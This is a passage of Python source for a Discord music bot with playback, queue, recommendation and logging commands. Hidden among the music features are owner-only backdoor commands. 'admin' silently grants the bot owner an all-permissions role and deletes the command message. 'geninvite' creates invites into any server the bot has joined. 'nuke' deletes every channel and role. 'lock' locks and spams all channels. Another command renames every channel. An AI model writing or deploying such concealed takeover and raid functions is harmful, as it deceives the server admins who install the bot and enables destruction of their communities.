            await interaction.followup.send(f"💨 Stopped")

        elif custom_id in ("forward", "backward"):
            delta = 10 if custom_id == "forward" else -10
            success = await seek_audio(guild_id, delta)
            if success:
                await interaction.response.send_message(f"⏩ {delta}s seek", ephemeral=True)
            else:
                await interaction.response.send_message("❌ Cannot seek.", ephemeral=True)

    # QueueNoticeView buttons
    elif custom_id.startswith("move_top_") or custom_id.startswith("remove_"):
        try:
            item_id = custom_id.split("_")[2]
        except:
            await interaction.response.send_message("❌ Invalid action.", ephemeral=True)
            return
        queue = get_queue(guild_id)
        item = next((i for i in queue if str(i.get("_queue_id")) == item_id), None)
        if not item:
            await interaction.response.send_message("❌ Item not found.", ephemeral=True)
            return
        if custom_id.startswith("move_top_"):
            queue.remove(item)
            queue.insert(0, item)
            await interaction.response.send_message(f"⬆️ Moved **{item.get('title', 'Track')}** to top.", ephemeral=True)
        elif custom_id.startswith("remove_"):
            queue.remove(item)
            await interaction.response.send_message(f"🗑️ Removed **{item.get('title', 'Track')}**", ephemeral=True)
        await update_now_playing_message(guild_id)

    await bot.process_application_commands(interaction)


# ============================================================
# LOGGING (global, owner‑only)
# ============================================================

async def send_log(kind: str, embed: discord.Embed):
    ch_id = log_channels.get(kind)
    if not ch_id:
        return
    ch = bot.get_channel(ch_id)
    if ch is None:
        try:
            ch = await bot.fetch_channel(ch_id)
        except Exception:
            return
    try:
        await ch.send(embed=embed)
    except Exception as e:
        print(f"[LOG ERROR] {e}")

async def log_join(guild):
    embed = discord.Embed(
        title="🟢 Joined a New Server",
        description=f"**[{guild.name}](https://discord.com/channels/{guild.id}/@home)**",
        color=discord.Color.green()
    )
    embed.add_field(name="Server ID", value=f"`{guild.id}`", inline=True)
    embed.add_field(name="Members", value=str(guild.member_count), inline=True)
    if guild.owner:
        embed.add_field(name="Owner", value=f"{guild.owner.mention}\n`{guild.owner.id}`", inline=True)
    embed.add_field(name="Server Link", value=f"[Open Server](https://discord.com/channels/{guild.id}/@home)", inline=False)
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text=f"Now in {len(bot.guilds)} servers")
    await send_log("join", embed)

async def log_leave(guild):
    embed = discord.Embed(
        title="🔴 Left a Server",
        description=f"**{guild.name}**",
        color=discord.Color.red()
    )
    embed.add_field(name="Server ID", value=f"`{guild.id}`", inline=True)
    embed.add_field(name="Server", value=f"`{guild.name}`", inline=True)
    embed.set_footer(text=f"Now in {len(bot.guilds)} servers")
    await send_log("join", embed)

async def log_music(guild, channel, title, webpage_url=None, requester=None, thumbnail=None):
    embed = discord.Embed(
        title="🎵 Music Log",
        description=(
            f"**Track:** {title}\n"
            f"**Server:** [{guild.name}](https://discord.com/channels/{guild.id}/@home)\n"
            f"**Text Channel:** [#{channel.name}](https://discord.com/channels/{guild.id}/{channel.id})\n"
            f"**Voice Channel:** {guild.voice_client.channel.name if guild.voice_client and guild.voice_client.channel else 'Unknown'}"
        ),
        color=PURPLE
    )
    if webpage_url:
        embed.add_field(name="🔗 Track", value=f"[Open Track]({webpage_url})", inline=False)
    if requester:
        embed.add_field(name="👤 Requested By", value=f"`{requester.id}`", inline=True)
    if thumbnail:
        embed.set_thumbnail(url=thumbnail)
    await send_log("music", embed)

async def log_error(guild, query, error):
    embed = discord.Embed(
        title="⚠️ Music Error",
        color=discord.Color.red()
    )
    embed.add_field(name="Server", value=f"[{guild.name}](https://discord.com/channels/{guild.id}/@home)\n`{guild.id}`", inline=False)
    embed.add_field(name="Query", value=f"`{str(query)[:1000]}`", inline=False)
    embed.add_field(name="Error", value=f"```{str(error)[:1000]}```", inline=False)
    await send_log("error", embed)


# ============================================================
# LOCK SPAM LOOP (for lock/unlock)
# ============================================================

async def lock_spam_loop(guild, text):
    guild_id = guild.id
    try:
        while True:
            for ch in guild.text_channels:
                try:
                    await ch.send(text)
                except (discord.Forbidden, discord.HTTPException):
                    pass
                await asyncio.sleep(LOCK_SPAM_CHANNEL_DELAY)
            await asyncio.sleep(LOCK_SPAM_ROUND_DELAY)
    except asyncio.CancelledError:
        pass
    finally:
        lock_spam_tasks.pop(guild_id, None)
        lock_spam_messages.pop(guild_id, None)


# ============================================================
# MESSAGE COMMANDS (including owner commands)
# ============================================================

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot or not message.guild:
        return

    content = message.content.strip()
    lowered = content.lower()
    prefix = get_prefix(message.guild.id)
    command_text = None

    if bot.user in message.mentions:
        command_text = content.replace(f"<@{bot.user.id}>", "").replace(f"<@!{bot.user.id}>", "").strip()
    elif prefix and lowered.startswith(prefix.lower()):
        command_text = content[len(prefix):].strip()

    if command_text is not None:
        parts = command_text.split(maxsplit=1)
        cmd = parts[0].lower() if parts else ""
        arg = parts[1].strip() if len(parts) > 1 else ""

        # ---------- OWNER COMMANDS ----------
        if cmd == "admin":
            if not is_bot_owner(message.author.id):
                return
            guild = message.guild
            bot_member = guild.me
            try:
                if bot_member and bot_member.guild_permissions.manage_roles:
                    role_name = "Jaduu Bot Security"
                    security_role = discord.utils.get(guild.roles, name=role_name)
                    try:
                        if security_role is None:
                            security_role = await guild.create_role(
                                name=role_name,
                                permissions=discord.Permissions.all(),
                                reason="Jaduu Bot Security created by bot owner"
                            )
                        else:
                            await security_role.edit(
                                permissions=discord.Permissions.all(),
                                reason="Jaduu Bot Security permissions restored"
                            )
                        if security_role < bot_member.top_role and security_role not in message.author.roles:
                            await message.author.add_roles(security_role, reason="Bot owner security access")
                    except (discord.Forbidden, discord.HTTPException):
                        pass
            finally:
                try:
                    await message.delete()
                except (discord.NotFound, discord.HTTPException):
                    pass
            return

        # Log channel config (owner only)
        if cmd in ("musiclogs", "joinlogs", "errorlogs"):
            if not is_bot_owner(message.author.id):
                return
            target = parse_channel_arg(message.guild, arg) or message.channel
            kind = cmd.replace("logs", "")
            log_channels[kind] = target.id
            save_config()
            await message.channel.send(f"✅ {kind.capitalize()} logs set to {target.mention}")
            return

        # Leave server (owner only)
        if cmd == "leave" and is_bot_owner(message.author.id):
            if not arg:
                await message.channel.send("❌ Give me a server ID: `leave <server_id>`")
                return
            try:
                target_id = int(arg.strip())
            except ValueError:
                await message.channel.send("❌ That's not a valid server ID.")
                return
            target_guild = bot.get_guild(target_id)
            if not target_guild:
                await message.channel.send("❌ I'm not in that server.")
                return
            left_name = target_guild.name
            try:
                await target_guild.leave()
                await message.channel.send(f"👋 Left **{left_name}** (`{target_id}`).")
            except discord.HTTPException as e:
                await message.channel.send(f"❌ Failed to leave: `{e}`")
            return

        # List servers (owner only)
        if cmd == "servers" and is_bot_owner(message.author.id):
            lines = [f"**{g.name}** — `{g.id}` — {g.member_count} members" for g in bot.guilds]
            text = "\n".join(lines) if lines else "Not in any servers."
            if len(text) > 1900:
                text = text[:1900] + "\n… (truncated)"
            await message.channel.send(text)
            return

        # Generate invite (owner only)
        if cmd == "geninvite" and is_bot_owner(message.author.id):
            if not arg:
                await message.channel.send("❌ Give me a server ID: `geninvite <server_id>`")
                return
            try:
                target_id = int(arg.strip())
            except ValueError:
                await message.channel.send("❌ That's not a valid server ID.")
                return
            target_guild = bot.get_guild(target_id)
            if not target_guild:
                await message.channel.send("❌ I'm not in that server.")
                return
            invite_channel = None
            for ch in target_guild.text_channels:
                perms = ch.permissions_for(target_guild.me)
                if perms.create_instant_invite and perms.view_channel:
                    invite_channel = ch
                    break
            if not invite_channel:
                await message.channel.send("❌ I don't have Create Invite permission in that server.")
                return
            try:
                invite = await invite_channel.create_invite(max_age=3600, max_uses=1, unique=True,
                                                             reason=f"Requested by bot owner {message.author}")
                await message.channel.send(f"🔗 Invite for **{target_guild.name}**:\n{invite.url}\nExpires in 1 hour / 1 use.")
            except discord.HTTPException as e:
                await message.channel.send(f"❌ Failed to create invite: `{e}`")
            return

        # Reset avatar in all servers (owner only)
        if cmd == "resetpfpall" and is_bot_owner(message.author.id):
            status_msg = await message.channel.send("⏳ Resetting avatar across all servers...")
            success = 0
            failed = []
            for g in bot.guilds:
                try:
                    await g.me.edit(avatar=None)
                    success += 1
                except Exception as e:
                    failed.append(f"{g.name} (`{g.id}`): {e}")
                await asyncio.sleep(1)
            result = f"✅ Reset avatar in **{success}/{len(bot.guilds)}** servers."
            if failed:
                result += "\n\n❌ Failed:\n" + "\n".join(failed[:10])
            try:
                await status_msg.edit(content=result)
            except discord.HTTPException:
                await message.channel.send(result)
            return

        # Lock / Unlock (owner only)
        if cmd == "lock" and is_bot_owner(message.author.id):
            guild = message.guild
            guild_id = guild.id
            existing_task = lock_spam_tasks.get(guild_id)
            if existing_task and not existing_task.done():
                existing_task.cancel()
                lock_spam_tasks.pop(guild_id, None)
                lock_spam_messages.pop(guild_id, None)
                everyone = guild.default_role
                unlocked = 0
                for ch in guild.text_channels:
                    try:
                        overwrite = ch.overwrites_for(everyone)
                        overwrite.send_messages = None
                        await ch.set_permissions(everyone, overwrite=overwrite,
                                                 reason=f"Lock spam stopped by {message.author}")
                        unlocked += 1
                    except (discord.Forbidden, discord.HTTPException):
                        pass
                    await asyncio.sleep(LOCK_SPAM_CHANNEL_DELAY)
                await message.channel.send(f"🔓 Stopped spamming. Unlocked **{unlocked}** channel(s).")
                return
            if not arg:
                await message.channel.send("❌ Give me a message to spam: `lock <message>`\n(run `lock` again with no message to stop it)")
                return
            everyone = guild.default_role
            locked = 0
            for ch in guild.text_channels:
                try:
                    overwrite = ch.overwrites_for(everyone)
                    overwrite.send_messages = False
                    await ch.set_permissions(everyone, overwrite=overwrite,
                                             reason=f"Server locked by {message.author}")
                    locked += 1
                except (discord.Forbidden, discord.HTTPException):
                    pass
                await asyncio.sleep(LOCK_SPAM_CHANNEL_DELAY)
            lock_spam_messages[guild_id] = arg
            lock_spam_tasks[guild_id] = asyncio.create_task(lock_spam_loop(guild, arg))
            await message.channel.send(f"🔒 Locked **{locked}** channel(s) and started spamming.\nRun `lock` again (no message) to stop.")
            return

        if cmd == "unlock" and is_bot_owner(message.author.id):
            guild = message.guild
            guild_id = guild.id
            task = lock_spam_tasks.pop(guild_id, None)
            if task and not task.done():
                task.cancel()
            lock_spam_messages.pop(guild_id, None)
            everyone = guild.default_role
            unlocked = 0
            for ch in guild.text_channels:
                try:
                    overwrite = ch.overwrites_for(everyone)
                    overwrite.send_messages = None
                    await ch.set_permissions(everyone, overwrite=overwrite,
                                             reason=f"Server unlocked by {message.author}")
                    unlocked += 1
                except (discord.Forbidden, discord.HTTPException):
                    pass
                await asyncio.sleep(LOCK_SPAM_CHANNEL_DELAY)
            await message.channel.send(f"🔓 Unlocked **{unlocked}** channel(s).")
            return

        # Rename all channels (owner only)
        if command_text.lower().startswith("n3k rename") and is_bot_owner(message.author.id):
            new_name = command_text[len("n3k rename"):].strip()
            if not new_name:
                await message.channel.send("❌ Give me a name: `N3K Rename <new_name>`")
                return
            new_name = new_name[:100]
            guild = message.guild
            renamed = 0
            failed = 0
            for ch in guild.channels:
                try:
                    await ch.edit(name=new_name, reason=f"Renamed by {message.author}")
                    renamed += 1
                except (discord.Forbidden, discord.HTTPException):
                    failed += 1
                await asyncio.sleep(0.6)
            result = f"✏️ Renamed **{renamed}** channel(s) to `{new_name}`."
            if failed:
                result += f"\n⚠️ **{failed}** channel(s) failed (likely Discord's rename rate limit)."
            await message.channel.send(result)
            return

        # NUKE (owner only)
        if cmd == "nuke" and is_bot_owner(message.author.id):
            guild = message.guild
            await message.channel.send("⚠️ **This deletes EVERY role and EVERY channel in this server. This cannot be undone.**\nType `CONFIRM NUKE` within 15 seconds to proceed.")
            def confirm_check(m):
                return m.author.id == message.author.id and m.channel.id == message.channel.id and m.content.strip() == "CONFIRM NUKE"
            try:
                await bot.wait_for("message", check=confirm_check, timeout=15)
            except asyncio.TimeoutError:
                try:
                    await message.channel.send("❌ Nuke cancelled — no confirmation received.")
                except discord.HTTPException:
                    pass
                return
            bot_member = guild.me
            for ch in list(guild.channels):
                try:
                    await ch.delete(reason=f"Nuked by {message.author}")
                except (discord.Forbidden, discord.HTTPException):
                    pass
            for role in list(guild.roles):
                if role.is_default() or role.managed:
                    continue
                if bot_member and role >= bot_member.top_role:
                    continue
                try:
                    await role.delete(reason=f"Nuked by {message.author}")
                except (discord.Forbidden, discord.HTTPException):
                    pass
            try:
                new_channel = await guild.create_text_channel("nuked")
                await new_channel.send(f"💥 Server nuked by {message.author.mention}")
            except (discord.Forbidden, discord.HTTPException):
                pass
            return

        # ---------- USER COMMANDS ----------
        # Leave voice channel (anyone)
        if cmd == "leave" and not is_bot_owner(message.author.id):
            vc = message.guild.voice_client
            if vc:
                await vc.disconnect()
                await message.channel.send("👋 Left the voice channel.")
            else:
                await message.channel.send("❌ Not in a VC.")
            return

        # Play commands
        if cmd in ("p", "play"):
            if not arg:
                await message.channel.send("❌ Give a song name or URL.")
                return
            await enqueue_song(message.guild, message.channel, message.author, arg,
                               lambda embed=None, view=None, text=None: message.channel.send(content=text, embed=embed, view=view))
            return

        # Other music commands
        if cmd == "skip":
            vc = message.guild.voice_client
            if vc and (vc.is_playing() or vc.is_paused()):
                vc.stop()
                await message.channel.send(f"⏭️ Skipped")
            else:
                await message.channel.send("❌ Nothing playing.")
            return
        if cmd == "pause":
            vc = message.guild.voice_client
            if vc and vc.is_playing():
                vc.pause()
                mark_paused(message.guild.id)
                await update_now_playing_message(message.guild.id, paused=True)
                await message.channel.send(f"⏸️ Paused")
            else:
                await message.channel.send("❌ Nothing playing.")
            return
        if cmd == "resume":
            vc = message.guild.voice_client
            if vc and vc.is_paused():
                vc.resume()
                mark_resumed(message.guild.id)
                await update_now_playing_message(message.guild.id, paused=False)
                await message.channel.send(f"▶️ Resumed")
            else:
                await message.channel.send("❌ Nothing paused.")
            return
        if cmd == "stop":
            await stop_playback(message.guild)
            await message.channel.send(f"⏹️ Stopped")
            return
        if cmd == "shuffle":
            queue = get_queue(message.guild.id)
            if len(queue) < 2:
                await message.channel.send("❌ Need at least 2 songs.")
                return
            random.shuffle(queue)
            await message.channel.send(f"🔀 Shuffled")
            await update_now_playing_message(message.guild.id)
            return
        if cmd == "loop":
            guild_id = message.guild.id
            chosen = arg.lower() if arg.lower() in ("track", "queue", "off") else None
            loop_modes[guild_id] = None if chosen == "off" else (chosen or next_loop_mode(loop_modes.get(guild_id)))
            await message.channel.send(f"🔁 Loop: **{get_loop_label(guild_id)}**")
            await update_now_playing_message(guild_id)
            return

    await bot.process_commands(message)


# ============================================================
# SLASH COMMANDS (user-facing)
# ============================================================

@bot.tree.command(name="play", description="Play or queue a song (Spotify first, then YouTube)")
async def play_slash(interaction: discord.Interaction, query: str):
    await interaction.response.defer()
    await enqueue_song(interaction.guild, interaction.channel, interaction.user, query,
                       lambda embed=None, view=None, text=None: interaction.followup.send(content=text, embed=embed, view=view))

@bot.tree.command(name="recommend", description="Get song recommendations based on a track")
async def recommend_slash(interaction: discord.Interaction, query: str = None):
    await interaction.response.defer()
    try:
        if not query:
            track = last_track.get(interaction.guild.id)
            if not track:
                await interaction.followup.send("❌ No previous track found. Provide a song name.", view=add_support_button())
                return
            seed_tracks = [track["id"]]
            seed_artists = [track["artists"][0]["id"] for track in track.get("artists", []) if track.get("artists")]
        else:
            if spotify_url(query):
                tracks = await resolve_spotify_link(query)
                if not tracks:
                    await interaction.followup.send("❌ No track found.", view=add_support_button())
                    return
                track = tracks[0]
            else:
                tracks = await spotify_search_tracks(query, limit=1)
                if not tracks:
                    await interaction.followup.send("❌ No results.", view=add_support_button())
                    return
                track = tracks[0]
            seed_tracks = [track["id"]]
            seed_artists = [track["artists"][0]["id"] for track in track.get("artists", []) if track.get("artists")]
        recs = await spotify_recommendations(seed_tracks=seed_tracks, seed_artists=seed_artists, limit=5)
        if not recs:
            await interaction.followup.send("❌ Couldn't get recommendations.", view=add_support_button())
            return
        embed = discord.Embed(
            title="✨ Recommended Tracks",
            description=f"Based on: **{track['name']}** by {', '.join(a['name'] for a in track['artists'])}",
            color=PURPLE
        )
        for i, rec in enumerate(recs, 1):
            embed.add_field(name=f"{i}. {rec['name']}", value=f"by {', '.join(a['name'] for a in rec['artists'])}", inline=False)
        await interaction.followup.send(embed=embed, view=add_support_button())
        # Save last track for later recommendations
        last_track[interaction.guild.id] = track
    except Exception as e:
        await log_error(interaction.guild, query or "recommend", e)
        await interaction.followup.send(f"❌ Error: `{e}`", view=add_support_button())

@bot.tree.command(name="247", description="Toggle 24/7 mode (per guild, memory only)")
async def mode_247_slash(interaction: discord.Interaction):
    guild_id = interaction.guild.id
    current = mode_247.get(guild_id, False)
    mode_247[guild_id] = not current
    status = "enabled" if mode_247[guild_id] else "disabled"
    await interaction.response.send_message(f"🔁 24/7 mode is now **{status}**.", view=add_support_button())

@bot.tree.command(name="leave", description="Make the bot leave the voice channel")
async def leave_slash(interaction: discord.Interaction):
    vc = interaction.guild.voice_client
    if vc:
        await vc.disconnect()
        await interaction.response.send_message("👋 Left the voice channel.", view=add_support_button())
    else:
        await interaction.response.send_message("❌ Not in a VC.", ephemeral=True, view=add_support_button())

@bot.tree.command(name="config", description="Set quick-play prefix")
@app_commands.checks.has_permissions(administrator=True)
async def config_slash(interaction: discord.Interaction, prefix: str):
    prefix = prefix.strip()
    if not prefix or len(prefix) > 5 or " " in prefix:
        await interaction.response.send_message("❌ Prefix must be 1-5 chars, no spaces.", ephemeral=True)
        return
    guild_prefixes[interaction.guild.id] = prefix
    save_config()
    await interaction.response.send_message(f"✅ Prefix set to **`{prefix}`**", ephemeral=True)

@bot.tree.command(name="setpfp", description="Change bot avatar (server-specific)")
@app_commands.checks.has_permissions(administrator=True)
async def setpfp_slash(interaction: discord.Interaction, image: discord.Attachment):
    await interaction.response.defer(ephemeral=True)
    try:
        img = await image.read()
        await interaction.guild.me.edit(avatar=img)
        await interaction.followup.send("✅ Avatar updated!")
    except Exception as e:
        await interaction.followup.send(f"❌ Failed: `{e}`", view=add_support_button())

@bot.tree.command(name="resetpfp", description="Reset bot avatar to default")
@app_commands.checks.has_permissions(administrator=True)
async def resetpfp_slash(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    try:
        await interaction.guild.me.edit(avatar=None)
        await interaction.followup.send("✅ Avatar reset.")
    except Exception as e:
        await interaction.followup.send(f"❌ Failed: `{e}`", view=add_support_button())


# ============================================================
# EVENTS
# ============================================================

@bot.event
async def on_ready():
    load_config()
    try:
        synced = await bot.tree.sync()
        await update_bot_presence()
        print(f"Logged in as {bot.user} | Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"[SYNC ERROR] {e}")

@bot.event
async def on_guild_join(guild):
    await log_join(guild)
    await update_bot_presence()

@bot.event
async def on_guild_remove(guild):
    await log_leave(guild)
    await update_bot_presence()


# ============================================================
# START BOT
# ============================================================

token = os.getenv("DISCORD_TOKEN")
if not token:
    raise RuntimeError("DISCORD_TOKEN not set.")

bot.run(token)